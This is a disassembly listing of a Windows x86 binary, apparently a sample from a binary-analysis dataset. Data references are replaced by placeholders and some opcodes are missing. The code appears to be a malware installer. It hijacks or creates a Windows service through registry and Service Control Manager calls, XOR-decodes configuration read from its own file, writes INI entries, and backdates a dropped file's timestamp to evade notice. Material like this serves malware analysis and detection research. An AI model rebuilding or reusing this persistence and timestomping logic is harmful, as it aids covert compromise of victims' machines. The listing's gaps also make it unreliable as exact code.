sub_401054
push ebp
mov ebp esp
sub esp 0x208
push esi
push rw-data
push 0x1
push 0x0
call [ CreateMutexA@IAT ]
mov esi eax
call [ GetLastError@IAT ]
cmp eax 0xb7
je r-xdata
xor eax eax
pop esi
leave
retn 0x10
cmp eax 0x5
je r-xdata
push esi
call [ ReleaseMutex@IAT ]
push esi
call [ CloseHandle@IAT ]
call sub_40173b
test eax eax
je r-xdata
push 0xa
call [ Sleep@IAT ]
push sub_40167d
call [ SetUnhandledExceptionFilter@IAT ]
call sub_401125
push rw-data
mov esi eax
call [ DeleteFileA@IAT ]
test esi esi
je r-xdata
push esi
call sub_40168c
lea eax [ ebp - 0x104 ]
mov [ esp ] 0x104
push eax
call [ GetWindowsDirectoryA@IAT ]
lea eax [ ebp - 0x104 ]
push eax
lea eax [ ebp - 0x208 ]
push rw-data
push eax
call [ wsprintfA@IAT ]
add esp 0xc
lea eax [ ebp - 0x208 ]
push eax
push esi
push rw-data
push rw-data
call [ WritePrivateProfileStringA@IAT ]
push esi
call sub_40403c
pop ecx
sub_401125
mov eax sub_40d68c
call sub_405888
sub esp 0xe7c
push ebx
push esi
push edi
mov esi rw-data
mov [ ebp - 0x10 ] esp
push 0x7
pop ecx
lea edi [ ebp - 0x8c ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
lea eax [ ebp - 0x8c ]
xor ebx ebx
push rw-data
push eax
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x14 ] 0x80000002
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x4 ] ebx
movsb [ edi ] [ esi ]
call sub_4053d0
pop ecx
lea eax [ ebp - 0x14 ]
pop ecx
push eax
push 0x1
lea eax [ ebp - 0x8c ]
push ebx
push eax
push [ ebp - 0x14 ]
call [ RegOpenKeyExA@IAT ]
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x50 ]
mov [ ebp - 0x50 ] 0x400
push eax
lea eax [ ebp - 0xc88 ]
push eax
lea eax [ ebp - 0x6c ]
push eax
push ebx
push rw-data
push [ ebp - 0x14 ]
call [ RegQueryValueExA@IAT ]
push [ ebp - 0x14 ]
mov esi eax
call [ RegCloseKey@IAT ]
push esi
call [ SetLastError@IAT ]
cmp esi ebx
je r-xdata
lea eax [ ebp - 0x44 ]
push r--data
push eax
mov [ ebp - 0x44 ] rw-data
call sub_4058a7
mov edi [ Sleep@IAT ]
push 0xa
call edi
push 0xf003f
push ebx
push ebx
call [ OpenSCManagerA@IAT ]
cmp eax ebx
mov [ ebp - 0x28 ] eax
jne r-xdata
lea eax [ ebp - 0x40 ]
push r--data
push eax
mov [ ebp - 0x40 ] rw-data
call sub_4058a7
push rw-data
call [ LoadLibraryA@IAT ]
push rw-data
push eax
call [ GetProcAddress@IAT ]
lea ecx [ ebp - 0x294 ]
push 0x104
push ecx
call eax
lea esi [ ebp - 0xc88 ]
lea eax [ ebp - 0x58 ]
push r--data
push eax
mov [ ebp - 0x58 ] rw-data
call sub_4058a7
cmp [ ebp - 0x18 ] ebx
jne r-xdata
push esi
lea eax [ ebp - 0x888 ]
push rw-data
push eax
call [ wsprintfA@IAT ]
add esp 0xc
lea eax [ ebp - 0x14 ]
push eax
push 0x1
lea eax [ ebp - 0x888 ]
push ebx
push eax
push 0x80000002
call [ RegOpenKeyExA@IAT ]
cmp eax ebx
jne r-xdata
push esi
call [ lstrlenA@IAT ]
inc eax
push eax
call sub_40527e
pop ecx
mov [ ebp - 0x1c ] eax
push esi
push eax
call [ lstrcpyA@IAT ]
cmp [ ebp - 0x18 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
push 0x104
lea eax [ ebp - 0x190 ]
push ebx
push eax
call sub_405360
add esp 0xc
lea eax [ ebp - 0x294 ]
push esi
push eax
lea eax [ ebp - 0x190 ]
push rw-data
push eax
call [ wsprintfA@IAT ]
add esp 0x10
push 0xa
call edi
lea eax [ ebp - 0x190 ]
push eax
call [ DeleteFileA@IAT ]
lea eax [ ebp - 0x190 ]
push eax
call [ GetFileAttributesA@IAT ]
cmp eax 0xffffffff
jne r-xdata
push [ ebp - 0x14 ]
call [ RegCloseKey@IAT ]
jmp r-xdata
push 0xa
call edi
push [ ebp - 0x18 ]
mov esi [ CloseServiceHandle@IAT ]
call esi
push [ ebp - 0x28 ]
call esi
push 0x400
lea eax [ ebp - 0xc88 ]
push rw-data
push eax
mov [ ebp - 0x14 ] 0x80000002
call sub_405180
push 0x64
lea eax [ ebp - 0xc88 ]
push [ ebp - 0x1c ]
push eax
call sub_405050
add esp 0x18
lea eax [ ebp - 0x14 ]
push eax
push 0xf003f
lea eax [ ebp - 0xc88 ]
push ebx
push eax
push [ ebp - 0x14 ]
call [ RegOpenKeyExA@IAT ]
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x54 ]
push r--data
push eax
mov [ ebp - 0x54 ] rw-data
call sub_4058a7
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
push ebx
push esi
call sub_4052a0
pop ecx
inc eax
pop ecx
mov esi eax
jmp r-xdata
push rw-data
call [ LoadLibraryA@IAT ]
push rw-data
push eax
call [ GetProcAddress@IAT ]
push ebx
push ebx
push ebx
push ebx
mov ecx rw-data
push ebx
push ecx
push 0x1
push 0x2
push 0x20
push 0xf01ff
push esi
push esi
push [ ebp - 0x28 ]
call eax
cmp eax ebx
mov [ ebp - 0x18 ] eax
jne r-xdata
push 0xa
mov [ ebp - 0x20 ] 0x120
call edi
lea eax [ ebp - 0x20 ]
push 0x4
push eax
push 0x4
push ebx
push rw-data
push [ ebp - 0x14 ]
call [ RegSetValueExA@IAT ]
mov esi [ SetLastError@IAT ]
push eax
mov [ ebp - 0x24 ] eax
call esi
cmp [ ebp - 0x24 ] ebx
je r-xdata
lea eax [ ebp - 0x4c ]
push r--data
push eax
mov [ ebp - 0x4c ] rw-data
call sub_4058a7
cmp [ esi ] bl
je r-xdata
push 0xa
call edi
lea eax [ ebp - 0x30 ]
push eax
push rw-data
push [ ebp - 0x14 ]
call [ RegCreateKeyA@IAT ]
mov edi eax
push edi
call esi
cmp edi ebx
je r-xdata
lea eax [ ebp - 0x48 ]
push r--data
push eax
mov [ ebp - 0x48 ] rw-data
call sub_4058a7
push rw-data
push rw-data
call sub_40502e
mov esi rw-data
lea edi [ ebp - 0x694 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov [ ebp - 0x20 ] eax
mov ecx 0xfd
xor eax eax
lea edi [ ebp - 0x68a ]
[ edi ]
stosw [ edi ]
mov esi rw-data
lea eax [ ebp - 0x694 ]
push esi
push eax
call sub_4053d0
add esp 0x10
lea eax [ ebp - 0x190 ]
push eax
lea eax [ ebp - 0xe88 ]
push [ ebp - 0x1c ]
push rw-data
push eax
call sub_404fab
lea eax [ ebp - 0xe88 ]
push eax
lea eax [ ebp - 0x694 ]
push eax
call sub_4053d0
lea eax [ ebp - 0x694 ]
push esi
push eax
call sub_4053d0
add esp 0x20
lea eax [ ebp - 0x694 ]
push [ ebp - 0x20 ]
push eax
call sub_404f30
pop ecx
push eax
lea eax [ ebp - 0x694 ]
push 0x1
push eax
call sub_404dee
push [ ebp - 0x20 ]
call sub_404d71
add esp 0x14
push 0xa
call [ Sleep@IAT ]
mov esi rw-data
push esi
call [ LoadLibraryA@IAT ]
push rw-data
push eax
call [ GetProcAddress@IAT ]
push ebx
push rw-data
call eax
jmp r-xdata
lea eax [ ebp - 0x34 ]
push r--data
push eax
mov [ ebp - 0x34 ] rw-data
call sub_4058a7
push [ ebp - 0x14 ]
mov edi [ RegCloseKey@IAT ]
or [ ebp - 0x4 ] 0xffffffff
call edi
push [ ebp - 0x30 ]
call edi
push [ ebp - 0x18 ]
mov edi [ CloseServiceHandle@IAT ]
call edi
push [ ebp - 0x28 ]
call edi
cmp [ ebp - 0x1c ] ebx
je r-xdata
mov eax [ ebp - 0x1c ]
push ebx
push 0x80
push 0x2
push ebx
push ebx
lea eax [ ebp - 0x190 ]
push 0x40000000
push eax
call [ CreateFileA@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
push esi
call [ LoadLibraryA@IAT ]
push rw-data
push eax
call [ GetProcAddress@IAT ]
push 0x7d0
call eax
push 0x10
lea eax [ ebp - 0x68 ]
push ebx
push eax
call sub_405360
add esp 0xc
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x68 ] 0x7d4
mov [ ebp - 0x66 ] 0x8
push eax
lea eax [ ebp - 0x68 ]
push eax
mov [ ebp - 0x62 ] 0x11
mov [ ebp - 0x60 ] 0x14
mov [ ebp - 0x5e ] bx
call [ SystemTimeToFileTime@IAT ]
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call [ LocalFileTimeToFileTime@IAT ]
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x3c ]
push ebx
push eax
push edi
call [ SetFileTime@IAT ]
push esi
mov [ ebp - 0x24 ] ebx
call [ LoadLibraryA@IAT ]
push rw-data
push eax
call [ GetProcAddress@IAT ]
lea ecx [ ebp - 0x24 ]
push ebx
push ecx
push 0x1fa00
push rw-data
push edi
call eax
push 0xa
call [ Sleep@IAT ]
push edi
call [ CloseHandle@IAT ]
sub_40168c
push ebp
mov ebp esp
sub esp 0x14
push edi
xor edi edi
push 0x2
push edi
push edi
call [ OpenSCManagerA@IAT ]
cmp eax edi
mov [ ebp - 0x4 ] eax
je r-xdata
pop edi
leave
retn
push ebx
push esi
push 0x10010
push [ ebp + 0x8 ]
push eax
call [ OpenServiceA@IAT ]
mov esi [ CloseServiceHandle@IAT ]
mov ebx eax
cmp ebx edi
je r-xdata
push [ ebp - 0x4 ]
call esi
pop esi
pop ebx
push 0x10
lea eax [ ebp - 0x14 ]
push edi
push eax
call sub_405360
add esp 0xc
lea eax [ ebp - 0x14 ]
push rw-data
push eax
call sub_404fab
lea eax [ ebp - 0x14 ]
push rw-data
push eax
call sub_4053d0
add esp 0x10
push rw-data
call [ LoadLibraryA@IAT ]
lea ecx [ ebp - 0x14 ]
push ecx
push eax
call [ GetProcAddress@IAT ]
push edi
push edi
push ebx
call eax
push ebx
call esi
sub_401719
xor edx edx
cmp [ esp + 0x8 ] edx
jle r-xdata
retn
mov eax [ esp + 0x4 ]
lea ecx [ edx + eax ]
mov al [ edx + eax ]
test al al
je r-xdata
inc edx
cmp edx [ esp + 0x8 ]
jl r-xdata
xor al 0x3e
mov [ ecx ] al
sub_40173b
mov eax sub_40d6cc
call sub_405888
sub esp 0x5dc
mov al [ ebp - 0xd ]
push ebx
push esi
xor ebx ebx
push edi
push ebx
lea ecx [ ebp - 0x98 ]
mov [ ebp - 0x98 ] al
call sub_402176
mov esi rw-data
push esi
call sub_404f30
pop ecx
push eax
push esi
lea ecx [ ebp - 0x98 ]
call sub_4021b2
mov al [ ebp - 0xd ]
push ebx
lea ecx [ ebp - 0x88 ]
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x88 ] al
call sub_402176
push esi
call sub_404f30
pop ecx
push eax
push esi
lea ecx [ ebp - 0x88 ]
call sub_4021b2
mov al [ ebp - 0xd ]
push ebx
lea ecx [ ebp - 0x78 ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x78 ] al
call sub_402176
push esi
call sub_404f30
pop ecx
push eax
push esi
lea ecx [ ebp - 0x78 ]
call sub_4021b2
mov edi 0x104
lea eax [ ebp - 0x4e4 ]
push edi
push eax
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x68 ] ebx
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x28 ] ebx
call [ GetWindowsDirectoryA@IAT ]
lea eax [ ebp - 0x4e4 ]
push eax
lea eax [ ebp - 0x1dc ]
push rw-data
push eax
call sub_404fab
add esp 0xc
lea eax [ ebp - 0x1dc ]
push ebx
push 0x80
push 0x2
push ebx
push 0x3
push 0xc0000000
push eax
call [ CreateFileA@IAT ]
cmp eax 0xffffffff
je r-xdata
xor edi edi
push eax
call [ CloseHandle@IAT ]
lea eax [ ebp - 0x5e8 ]
push edi
push eax
push ebx
call [ GetModuleFileNameA@IAT ]
lea eax [ ebp - 0x5e8 ]
push rw-data
push eax
call sub_40502e
mov edi eax
pop ecx
cmp edi ebx
pop ecx
je r-xdata
push 0x80
lea eax [ ebp - 0x2dc ]
push ebx
push eax
call sub_405360
push ebx
push 0x2b0
push edi
call sub_4059f8
push edi
push 0x80
lea eax [ ebp - 0x2dc ]
push 0x1
push eax
call sub_4058e1
lea eax [ ebp - 0x2dc ]
push 0x80
push eax
call sub_401719
lea eax [ ebp - 0x2dc ]
push eax
call sub_404f30
add esp 0x34
test eax eax
jbe r-xdata
push 0x104
lea eax [ ebp - 0x3e0 ]
push ebx
push eax
call sub_405360
add esp 0xc
lea eax [ ebp - 0x2dc ]
push eax
lea eax [ ebp - 0x3e0 ]
push rw-data
push eax
call sub_404fab
push 0x80
lea eax [ ebp - 0x25c ]
push ebx
push eax
call sub_405360
push ebx
push 0x330
push edi
call sub_4059f8
push edi
push 0x80
lea eax [ ebp - 0x25c ]
push 0x1
push eax
call sub_4058e1
lea eax [ ebp - 0x25c ]
push 0x80
push eax
call sub_401719
lea eax [ ebp - 0x25c ]
push eax
call sub_404f30
add esp 0x40
test eax eax
jbe r-xdata
push esi
call sub_404f30
pop ecx
push eax
push esi
lea eax [ ebp - 0x25c ]
push eax
call sub_404f30
pop ecx
push eax
lea eax [ ebp - 0x25c ]
push eax
jmp r-xdata
push ebx
push 0x3f6
push edi
call sub_4059f8
push edi
push esi
lea eax [ ebp - 0x64 ]
push esi
push eax
call sub_4058e1
push edi
call sub_404d71
add esp 0x20
mov esi [ WritePrivateProfileStringA@IAT ]
lea eax [ ebp - 0x1dc ]
mov edi rw-data
push eax
lea eax [ ebp - 0x3e0 ]
push eax
push rw-data
push edi
call esi
lea eax [ ebp - 0xa8 ]
push eax
call sub_401fe7
pop ecx
push [ r--data ]
lea ecx [ ebp - 0x88 ]
mov [ ebp - 0x4 ] 0x3
push ebx
push eax
call sub_4020a8
push 0x1
lea ecx [ ebp - 0xa8 ]
mov [ ebp - 0x4 ] 0x2
call sub_402176
mov eax [ ebp - 0x84 ]
cmp eax ebx
jne r-xdata
push 0x10
lea eax [ ebp - 0x40 ]
push ebx
push eax
call sub_405360
push ebx
push 0x3c2
push edi
call sub_4059f8
push edi
push 0x10
lea eax [ ebp - 0x40 ]
push esi
push eax
call sub_4058e1
lea eax [ ebp - 0x40 ]
push 0x10
push eax
call sub_401719
lea eax [ ebp - 0x40 ]
push eax
call sub_404f30
add esp 0x34
test eax eax
jbe r-xdata
lea ecx [ ebp - 0x78 ]
call sub_4021b2
push ebx
push 0x3b0
push edi
call sub_4059f8
push edi
push 0x4
push 0x1
lea eax [ ebp - 0x30 ]
pop esi
push esi
push eax
call sub_4058e1
push ebx
push 0x3b4
push edi
call sub_4059f8
push edi
push 0x4
lea eax [ ebp - 0x20 ]
push esi
push eax
call sub_4058e1
push ebx
push 0x3b8
push edi
call sub_4059f8
add esp 0x44
lea eax [ ebp - 0x18 ]
push edi
push 0x4
push esi
push eax
call sub_4058e1
push ebx
push 0x3bc
push edi
call sub_4059f8
push edi
push 0x4
lea eax [ ebp - 0x28 ]
push esi
push eax
call sub_4058e1
push ebx
push 0x3c0
push edi
call sub_4059f8
push edi
push esi
lea eax [ ebp - 0x68 ]
push esi
push eax
call sub_4058e1
add esp 0x48
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x64 ] ebx
mov [ ebp - 0x24 ] ebx
push ebx
push 0x3c1
push edi
mov [ ebp - 0x2c ] ebx
call sub_4059f8
push edi
push esi
lea eax [ ebp - 0x1c ]
push esi
push eax
call sub_4058e1
add esp 0x1c
cmp [ ebp - 0x1c ] ebx
je r-xdata
lea ecx [ ebp - 0x1dc ]
push ecx
push eax
push rw-data
push edi
call esi
lea eax [ ebp - 0xa8 ]
push eax
call sub_401f2e
pop ecx
push [ r--data ]
lea ecx [ ebp - 0x98 ]
mov [ ebp - 0x4 ] 0x4
push ebx
push eax
call sub_4020a8
push 0x1
lea ecx [ ebp - 0xa8 ]
mov [ ebp - 0x4 ] 0x2
call sub_402176
mov eax [ ebp - 0x94 ]
cmp eax ebx
jne r-xdata
mov eax r--data
xor edi edi
jmp r-xdata
push 0x10
lea eax [ ebp - 0xb8 ]
push ebx
push eax
call sub_405360
add esp 0xc
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0xb8 ]
push rw-data
push eax
call sub_404fab
push ebx
push 0x3d2
push edi
call sub_4059f8
push edi
push 0x2
lea eax [ ebp - 0x24 ]
push esi
push eax
call sub_4058e1
add esp 0x28
cmp [ ebp - 0x24 ] ebx
jle r-xdata
lea ecx [ ebp - 0x1dc ]
push ecx
push eax
push rw-data
push edi
call esi
push 0x5
lea eax [ ebp - 0x58 ]
push ebx
push eax
call sub_405360
add esp 0xc
cmp [ ebp - 0x30 ] ebx
jg r-xdata
mov eax r--data
push esi
lea ecx [ ebp - 0x78 ]
mov [ ebp - 0x4 ] 0x1
call sub_402176
push esi
lea ecx [ ebp - 0x88 ]
mov [ ebp - 0x4 ] bl
call sub_402176
or [ ebp - 0x4 ] 0xffffffff
push esi
lea ecx [ ebp - 0x98 ]
call sub_402176
mov ecx [ ebp - 0xc ]
mov eax edi
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn
push 0x10
lea eax [ ebp - 0x40 ]
push ebx
push eax
call sub_405360
push ebx
push 0x3d4
push edi
call sub_4059f8
push edi
push 0x10
lea eax [ ebp - 0x40 ]
push esi
push eax
call sub_4058e1
lea eax [ ebp - 0x40 ]
push 0x10
push eax
call sub_401719
push 0x10
lea eax [ ebp - 0xc8 ]
push ebx
push eax
call sub_405360
add esp 0x3c
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0xc8 ]
push rw-data
push eax
call sub_404fab
push 0x10
lea eax [ ebp - 0x40 ]
push ebx
push eax
call sub_405360
push ebx
push 0x3e4
push edi
call sub_4059f8
push edi
push 0x10
lea eax [ ebp - 0x40 ]
push esi
push eax
call sub_4058e1
lea eax [ ebp - 0x40 ]
push 0x10
push eax
call sub_401719
push 0x10
lea eax [ ebp - 0xd8 ]
push ebx
push eax
call sub_405360
add esp 0x48
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0xd8 ]
push rw-data
push eax
call sub_404fab
push ebx
push 0x3f4
push edi
call sub_4059f8
push edi
push 0x2
lea eax [ ebp - 0x2c ]
push esi
push eax
call sub_4058e1
add esp 0x28
cmp [ ebp - 0x2c ] ebx
jge r-xdata
push [ ebp - 0x30 ]
lea eax [ ebp - 0x58 ]
push rw-data
push eax
call sub_404fab
add esp 0xc
lea eax [ ebp - 0x58 ]
push rw-data
push eax
call sub_404fab
pop ecx
pop ecx
jmp r-xdata
push [ ebp - 0x20 ]
lea eax [ ebp - 0x50 ]
push rw-data
push eax
call sub_404fab
add esp 0xc
lea eax [ ebp - 0x50 ]
push rw-data
push eax
call sub_404fab
pop ecx
pop ecx
jmp r-xdata
lea eax [ ebp - 0x1dc ]
push eax
lea eax [ ebp - 0x58 ]
push eax
push rw-data
push edi
call esi
push 0x5
lea eax [ ebp - 0x50 ]
push ebx
push eax
call sub_405360
add esp 0xc
cmp [ ebp - 0x20 ] ebx
jg r-xdata
push [ ebp - 0x18 ]
lea eax [ ebp - 0x60 ]
push rw-data
push eax
call sub_404fab
add esp 0xc
lea eax [ ebp - 0x60 ]
push rw-data
push eax
call sub_404fab
pop ecx
pop ecx
jmp r-xdata
lea eax [ ebp - 0x1dc ]
push eax
lea eax [ ebp - 0x50 ]
push eax
push rw-data
push edi
call esi
push 0x5
lea eax [ ebp - 0x60 ]
push ebx
push eax
call sub_405360
add esp 0xc
cmp [ ebp - 0x18 ] ebx
jg r-xdata
push [ ebp - 0x28 ]
lea eax [ ebp - 0x48 ]
push rw-data
push eax
call sub_404fab
add esp 0xc
lea eax [ ebp - 0x48 ]
push rw-data
push eax
call sub_404fab
pop ecx
pop ecx
jmp r-xdata
lea eax [ ebp - 0x1dc ]
push eax
lea eax [ ebp - 0x60 ]
push eax
push rw-data
push edi
call esi
push 0x5
lea eax [ ebp - 0x48 ]
push ebx
push eax
call sub_405360
add esp 0xc
cmp [ ebp - 0x28 ] ebx
jg r-xdata
lea ecx [ ebp - 0x1dc ]
push ecx
push eax
push rw-data
push edi
call esi
cmp [ ebp - 0x68 ] ebx
lea eax [ ebp - 0x1dc ]
push eax
je r-xdata
mov eax r--data
lea eax [ ebp - 0x1dc ]
push eax
lea eax [ ebp - 0x48 ]
push eax
push rw-data
push edi
call esi
mov eax [ ebp - 0x74 ]
cmp eax ebx
jne r-xdata
push rw-data
push rw-data
jmp r-xdata
push rw-data
push rw-data
push rw-data
push rw-data
mov edi rw-data
push rw-data
push edi
call esi
lea eax [ ebp - 0x1dc ]
push eax
lea eax [ ebp - 0xb8 ]
push eax
push rw-data
push edi
call esi
push 0x4
lea eax [ ebp - 0x14 ]
push ebx
push eax
call sub_405360
add esp 0xc
lea eax [ ebp - 0x14 ]
push [ ebp - 0x24 ]
push rw-data
push eax
call sub_404fab
add esp 0xc
lea eax [ ebp - 0x1dc ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push rw-data
push edi
call esi
lea eax [ ebp - 0x1dc ]
push eax
lea eax [ ebp - 0xc8 ]
push eax
push rw-data
push edi
call esi
lea eax [ ebp - 0x1dc ]
push eax
lea eax [ ebp - 0xd8 ]
push eax
push rw-data
push edi
call esi
push 0x4
lea eax [ ebp - 0x14 ]
push ebx
push eax
call sub_405360
add esp 0xc
lea eax [ ebp - 0x14 ]
push [ ebp - 0x2c ]
push rw-data
push eax
call sub_404fab
add esp 0xc
lea eax [ ebp - 0x1dc ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push rw-data
push edi
jmp r-xdata
push rw-data
push edi
call esi
cmp [ ebp - 0x1c ] ebx
lea eax [ ebp - 0x1dc ]
push eax
je r-xdata
push rw-data
push rw-data
jmp r-xdata
call esi
cmp [ ebp - 0x64 ] ebx
lea eax [ ebp - 0x1dc ]
push eax
je r-xdata
push 0x1
pop esi
push rw-data
push rw-data
call esi
push 0x1
pop edi
jmp r-xdata
sub_401f2e
push ebp
mov ebp esp
sub esp 0x20c
push esi
push edi
mov esi 0x104
xor edi edi
push esi
lea eax [ ebp - 0x20c ]
push edi
push eax
mov [ ebp - 0x4 ] edi
call sub_405360
push esi
lea eax [ ebp - 0x108 ]
push edi
push eax
call sub_405360
add esp 0x18
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] edi
push eax
push 0x5
push edi
call [ SHGetSpecialFolderLocation@IAT ]
cmp [ ebp - 0x4 ] edi
je r-xdata
lea eax [ ebp - 0x108 ]
push rw-data
push eax
call sub_404fab
pop ecx
pop ecx
lea eax [ ebp - 0x108 ]
push eax
push [ ebp - 0x4 ]
call [ SHGetPathFromIDListA@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x20c ]
push esi
push eax
lea eax [ ebp - 0x108 ]
push eax
call [ GetShortPathNameA@IAT ]
jmp r-xdata
mov esi [ ebp + 0x8 ]
mov al [ ebp + 0xb ]
push edi
mov ecx esi
mov [ esi ] al
call sub_402176
lea eax [ ebp - 0x108 ]
push eax
call sub_404f30
pop ecx
push eax
lea eax [ ebp - 0x108 ]
push eax
mov ecx esi
call sub_4021b2
mov eax esi
pop edi
pop esi
leave
retn
sub_401fe7
push ebp
mov ebp esp
sub esp 0x20c
push esi
push edi
mov esi 0x104
xor edi edi
push esi
lea eax [ ebp - 0x20c ]
push edi
push eax
mov [ ebp - 0x4 ] edi
call sub_405360
push esi
lea eax [ ebp - 0x108 ]
push edi
push eax
call sub_405360
add esp 0x18
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] edi
push eax
push 0x8
push edi
call [ SHGetSpecialFolderLocation@IAT ]
cmp [ ebp - 0x4 ] edi
je r-xdata
lea eax [ ebp - 0x108 ]
push rw-data
push eax
call sub_404fab
pop ecx
pop ecx
lea eax [ ebp - 0x108 ]
push eax
push [ ebp - 0x4 ]
call [ SHGetPathFromIDListA@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x20c ]
push esi
push eax
lea eax [ ebp - 0x108 ]
push eax
call [ GetShortPathNameA@IAT ]
jmp r-xdata
mov esi [ ebp + 0x8 ]
mov al [ ebp + 0xb ]
push edi
mov ecx esi
mov [ esi ] al
call sub_402176
lea eax [ ebp - 0x108 ]
push eax
call sub_404f30
pop ecx
push eax
lea eax [ ebp - 0x108 ]
push eax
mov ecx esi
call sub_4021b2
mov eax esi
pop edi
pop esi
leave
retn
sub_4020a8
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov edi ecx
cmp [ ebx + 0x8 ] eax
jae r-xdata
mov eax [ ebx + 0x8 ]
mov ecx [ ebp + 0xc ]
mov esi eax
sub esi ecx
cmp [ ebp + 0x10 ] esi
jae r-xdata
call sub_404273
cmp edi ebx
jne r-xdata
mov esi [ ebp + 0x10 ]
test esi esi
jbe r-xdata
push [ r--data ]
add esi ecx
mov ecx edi
push esi
call sub_4021e7
push [ ebp + 0xc ]
mov ecx edi
push 0x0
call sub_4021e7
jmp r-xdata
push 0x1
push esi
mov ecx edi
call sub_40224e
test al al
je r-xdata
cmp esi eax
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax [ ebx + 0x4 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0xc ]
push esi
add eax ecx
push eax
push [ edi + 0x4 ]
call sub_405ac0
mov eax [ edi + 0x4 ]
add esp 0xc
mov [ edi + 0x8 ] esi
and [ eax + esi ] 0x0
mov eax r--data
cmp [ eax - 0x1 ] 0xfe
jae r-xdata
mov eax r--data
push 0x1
mov ecx edi
call sub_402176
mov eax [ ebx + 0x4 ]
test eax eax
jne r-xdata
mov [ edi + 0x4 ] eax
mov ecx [ ebx + 0x8 ]
mov [ edi + 0x8 ] ecx
mov ecx [ ebx + 0xc ]
mov [ edi + 0xc ] ecx
inc [ eax - 0x1 ]
jmp r-xdata
mov eax r--data
sub_402176
cmp [ esp + 0x4 ] 0x0
push esi
mov esi ecx
je r-xdata
and [ esi + 0x4 ] 0x0
and [ esi + 0x8 ] 0x0
and [ esi + 0xc ] 0x0
pop esi
retn 0x4
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
test al al
je r-xdata
push ecx
call sub_40403c
pop ecx
cmp al 0xff
je r-xdata
dec al
mov [ ecx ] al
jmp r-xdata
sub_4021b2
push esi
push edi
mov edi [ esp + 0x10 ]
push 0x1
mov esi ecx
push edi
call sub_40224e
test al al
je r-xdata
mov eax esi
pop edi
pop esi
retn 0x8
push edi
push [ esp + 0x10 ]
push [ esi + 0x4 ]
call sub_405ac0
mov eax [ esi + 0x4 ]
add esp 0xc
mov [ esi + 0x8 ] edi
and [ eax + edi ] 0x0
sub_4021e7
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
mov edi ecx
cmp [ edi + 0x8 ] esi
jae r-xdata
mov ecx edi
call sub_402390
mov eax [ edi + 0x8 ]
mov ebx [ esp + 0x14 ]
sub eax esi
cmp eax ebx
jae r-xdata
call sub_404273
test ebx ebx
jbe r-xdata
mov ebx eax
mov eax edi
pop edi
pop esi
pop ebx
retn 0x8
mov ecx [ edi + 0x4 ]
sub eax ebx
add ecx esi
push eax
lea eax [ ecx + ebx ]
push eax
push ecx
call sub_405e00
mov esi [ edi + 0x8 ]
add esp 0xc
sub esi ebx
mov ecx edi
push 0x0
push esi
call sub_40224e
test al al
je r-xdata
mov eax [ edi + 0x4 ]
mov [ edi + 0x8 ] esi
and [ esi + eax ] 0x0
sub_40224e
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
cmp edi 0xfffffffd
jbe r-xdata
mov ecx [ esi + 0x4 ]
xor edx edx
cmp ecx edx
je r-xdata
call sub_404047
cmp edi edx
jne r-xdata
mov al [ ecx - 0x1 ]
cmp al dl
je r-xdata
cmp [ esp + 0x10 ] dl
je r-xdata
cmp [ esp + 0x10 ] dl
je r-xdata
cmp al 0xff
je r-xdata
cmp [ esi + 0xc ] edi
jae r-xdata
mov eax [ esi + 0xc ]
cmp eax 0x1f
ja r-xdata
cmp ecx edx
je r-xdata
push 0x1
jmp r-xdata
cmp edi edx
jne r-xdata
mov al 0x1
push edi
mov ecx esi
call sub_4022d3
push 0x1
mov ecx esi
call sub_402176
jmp r-xdata
cmp eax edi
jae r-xdata
xor al al
jmp r-xdata
mov [ esi + 0x8 ] edx
mov [ ecx ] dl
jmp r-xdata
mov ecx esi
call sub_402176
dec al
push edx
mov [ ecx - 0x1 ] al
pop edi
pop esi
retn 0x8
sub_4022d3
mov eax sub_40d6d8
call sub_405888
sub esp 0xc
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
or edi 0x1f
mov esi ecx
cmp edi 0xfffffffd
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] esi
jbe r-xdata
and [ ebp - 0x4 ] 0x0
lea eax [ edi + 0x2 ]
test eax eax
jge r-xdata
mov edi [ ebp + 0x8 ]
push eax
call sub_40527e
pop ecx
mov [ ebp + 0x8 ] eax
jmp r-xdata
xor eax eax
mov eax [ esi + 0x8 ]
